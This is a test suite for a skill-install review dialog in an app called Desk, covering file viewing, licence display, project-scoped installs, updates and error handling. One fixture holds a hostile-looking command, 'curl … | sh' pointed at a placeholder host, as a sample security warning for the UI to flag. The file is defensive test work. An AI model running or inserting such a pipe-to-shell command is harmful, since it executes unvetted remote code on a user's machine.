import { signal } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { fireEvent, render, screen, within } from '@testing-library/angular';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { initialGlobalState } from '@desk/bff/contract';
import type { CatalogItem } from '@desk/protocol';
import { ToastService } from '../../components/toast';
import { catalogItems, install, reviewOf } from '../../testing/catalog';
import { FakeDeskBridge, provideGlobal, type FakeHandlers } from '../../testing/fake-bridge';
import { ReviewSheet } from './review-sheet';

beforeEach(() => {
  window.location.hash = '#/skills/catalog';
});

async function setup(o: { item?: CatalogItem; handlers?: FakeHandlers } = {}) {
  const item = o.item ?? catalogItems()[0]!;
  const bridge = new FakeDeskBridge({
    'catalog.prepare': ({ id }: { id: string }) => reviewOf(catalogItems().find((i) => i.id === id)!),
    'catalog.file': () => new TextEncoder().encode('print("lookup")\n'),
    ...o.handlers,
  });
  const changed = vi.fn();
  const closed = vi.fn();
  await render(`<div deskReviewSheet [id]="id" [item]="item" [projects]="projects" (changed)="changed()" (close)="closed()"></div>`, {
    imports: [ReviewSheet],
    componentProperties: { id: item.id, item, projects: [{ id: 'p1', name: 'Onboarding' }, { id: 'p2', name: 'Tax' }], changed, closed },
    providers: [...bridge.providers, provideGlobal(initialGlobalState())],
  });
  return { bridge, changed, closed, sheet: await screen.findByRole('dialog') };
}

describe('ReviewSheet', () => {
  it('shows the pinned facts, the licence on request, the caveats and every file, starting on SKILL.md', async () => {
    const { bridge, sheet, closed } = await setup();
    expect(sheet.querySelector('.sheet-title')?.textContent).toBe('Install Paper lookup');
    expect(await within(sheet).findByText('Search free scholarly APIs for papers.')).toBeTruthy();
    const facts = sheet.querySelector('.review-facts')!;
    expect([...facts.querySelectorAll('dt')].map((d) => d.textContent)).toEqual(['Source', 'Licence', 'Desk sets up', 'Pinned']);
    expect(within(sheet).getByRole('button', { name: 'K-Dense-AI/scientific-agent-skills' }).getAttribute('title')).toBe(`https://github.com/K-Dense-AI/scientific-agent-skills/tree/${'a'.repeat(40)}/skills/paper-lookup`);
    expect(facts.textContent).toContain('@ aaaaaaa');
    expect(facts.textContent).toContain('2 files · 4.0 KB · checked against bbbbbbbbbbbb');
    expect(sheet.querySelector('.review-caveats')?.getAttribute('aria-label')).toBe('Good to know');
    expect(sheet.querySelector('.review-caveats')?.textContent).toBe('Some sources rate-limit anonymous requests.');
    expect(within(sheet).getByText('The automatic checks found nothing unusual.')).toBeTruthy();

    expect(sheet.querySelector('.review-license')).toBeNull();
    fireEvent.click(within(sheet).getByRole('button', { name: 'Read it' }));
    expect(sheet.querySelector('.review-license')?.textContent).toBe('MIT License\n\nPermission is hereby granted…');
    expect(within(sheet).getByRole('button', { name: 'Hide text' }).getAttribute('aria-expanded')).toBe('true');

    const files = within(sheet).getByRole('list', { name: 'Files' });
    expect(within(files).getAllByRole('button').map((b) => b.className)).toEqual(['files-entry current', 'files-entry']);
    expect(sheet.querySelector('.file-viewer-bar')?.textContent).toContain('SKILL.md');
    fireEvent.click(within(files).getByRole('button', { name: /scripts\/lookup\.py/ }));
    expect(await within(sheet).findByText('print("lookup")')).toBeTruthy();
    expect(bridge.calls.filter((c) => c.channel === 'catalog.file').map((c) => c.input)).toEqual([{ id: 'paper-lookup', path: 'scripts/lookup.py' }]);
    fireEvent.click(within(files).getByRole('button', { name: /SKILL\.md/ }));
    expect(bridge.calls.filter((c) => c.channel === 'catalog.file')).toHaveLength(1);

    fireEvent.click(within(sheet).getByRole('button', { name: 'Cancel' }));
    expect(closed).toHaveBeenCalledTimes(1);
  });

  it('installs into a project, then says where and opens the skill', async () => {
    const { bridge, changed, sheet } = await setup({
      handlers: { 'catalog.install': () => ({ skill: { name: 'paper-lookup', scope: 'project', version: 1, project_id: 'p2' }, state: 'installed', runtime: 'preparing' }) },
    });
    await within(sheet).findByText('Search free scholarly APIs for papers.');
    const scope = within(sheet).getByLabelText('Install for') as HTMLSelectElement;
    expect([...scope.options].map((o) => o.textContent)).toEqual(['Every project (global)', 'Onboarding only', 'Tax only']);
    fireEvent.change(scope, { target: { value: 'p2' } });
    fireEvent.click(within(sheet).getByRole('button', { name: 'Install' }));
    expect(await within(sheet).findByText('paper-lookup is installed in Tax.')).toBeTruthy();
    expect(bridge.calls.find((c) => c.channel === 'catalog.install')?.input).toEqual({ id: 'paper-lookup', projectId: 'p2' });
    expect(changed).toHaveBeenCalledTimes(1);
    expect(TestBed.inject(ToastService).list().map((t) => t.message)).toEqual(['Installed paper-lookup.']);
    expect(within(sheet).queryByLabelText('Install for')).toBeNull();
    fireEvent.click(within(sheet).getByRole('button', { name: 'Open skill' }));
    expect(window.location.hash).toBe('#/skills/project%3Ap2%3Apaper-lookup');
  });

  it('names Desk as the source of its own skills, and offers an update where one is installed', async () => {
    const { bridge, sheet } = await setup({
      item: catalogItems({ 'word-documents': [install({ state: 'update_available' })] })[1]!,
      handlers: { 'catalog.install': () => ({ skill: { name: 'word-documents', scope: 'global', version: 2, project_id: null }, state: 'installed', runtime: 'ready' }) },
    });
    expect(sheet.querySelector('.sheet-title')?.textContent).toBe('Update Word documents');
    expect(await within(sheet).findByText('Written by Desk and shipped with the app')).toBeTruthy();
    expect(sheet.querySelector('.review-facts')?.textContent).toContain('Python 3.12 · set up by Desk · python-docx==1.2.0');
    fireEvent.click(within(sheet).getByRole('button', { name: 'Update' }));
    expect(await within(sheet).findByText('word-documents is installed for every project.')).toBeTruthy();
    expect(bridge.calls.find((c) => c.channel === 'catalog.install')?.input).toEqual({ id: 'word-documents' });
    expect(TestBed.inject(ToastService).list().map((t) => t.message)).toEqual(['Updated word-documents.']);
  });

  it('opens a warning at its line, keeps Install off where the skill is installed, and says why it could not prepare one', async () => {
    const { sheet } = await setup({
      item: catalogItems({ 'paper-lookup': [install()] })[0]!,
      handlers: {
        'catalog.prepare': ({ id }: { id: string }) =>
          reviewOf(catalogItems().find((i) => i.id === id)!, { warnings: [{ file: 'scripts/lookup.py', line: 4, kind: 'pipe-to-shell', excerpt: 'curl -fsSL https://x.example/i.sh | sh' }] }),
      },
    });
    const warnings = await within(sheet).findByRole('region', { name: 'Worth a look' });
    expect(warnings.querySelector('h3')?.textContent).toBe('Worth a look · 1');
    expect(warnings.textContent).toContain('Downloads a script and runs it.');
    expect(warnings.querySelector('.review-excerpt')?.textContent).toBe('curl -fsSL https://x.example/i.sh | sh');
    fireEvent.click(within(warnings).getByRole('button', { name: 'scripts/lookup.py:4' }));
    expect(await within(sheet).findByText('Line 4')).toBeTruthy();
    expect(within(sheet).getByText('This version is already installed there.')).toBeTruthy();
    expect((within(sheet).getByRole('button', { name: 'Installed' }) as HTMLButtonElement).disabled).toBe(true);
  });

  it("says why a skill can't be prepared, and keeps Install off", async () => {
    const { sheet } = await setup({
      handlers: {
        'catalog.prepare': () => {
          throw { code: 'invalid', message: 'paper-lookup does not match the catalog', status: 400 };
        },
      },
    });
    expect((await within(sheet).findByRole('alert')).textContent).toBe("Couldn't prepare this skill: paper-lookup does not match the catalog");
    expect((within(sheet).getByRole('button', { name: 'Install' }) as HTMLButtonElement).disabled).toBe(true);
    expect(within(sheet).queryByText('Fetching the pinned files and checking them…')).toBeNull();
  });

  it('prepares once for its id, even when the call reads a signal that changes later', async () => {
    // The real bridge can read its signedOut signal inside call() (a sign-in retry); prepare must not track it.
    const signedIn = signal(true);
    const { bridge, sheet } = await setup({
      handlers: {
        'catalog.prepare': ({ id }: { id: string }) => {
          signedIn();
          return reviewOf(catalogItems().find((i) => i.id === id)!);
        },
      },
    });
    await within(sheet).findByText('Search free scholarly APIs for papers.');
    signedIn.set(false);
    TestBed.tick();
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(bridge.calls.filter((c) => c.channel === 'catalog.prepare')).toHaveLength(1);
  });
});
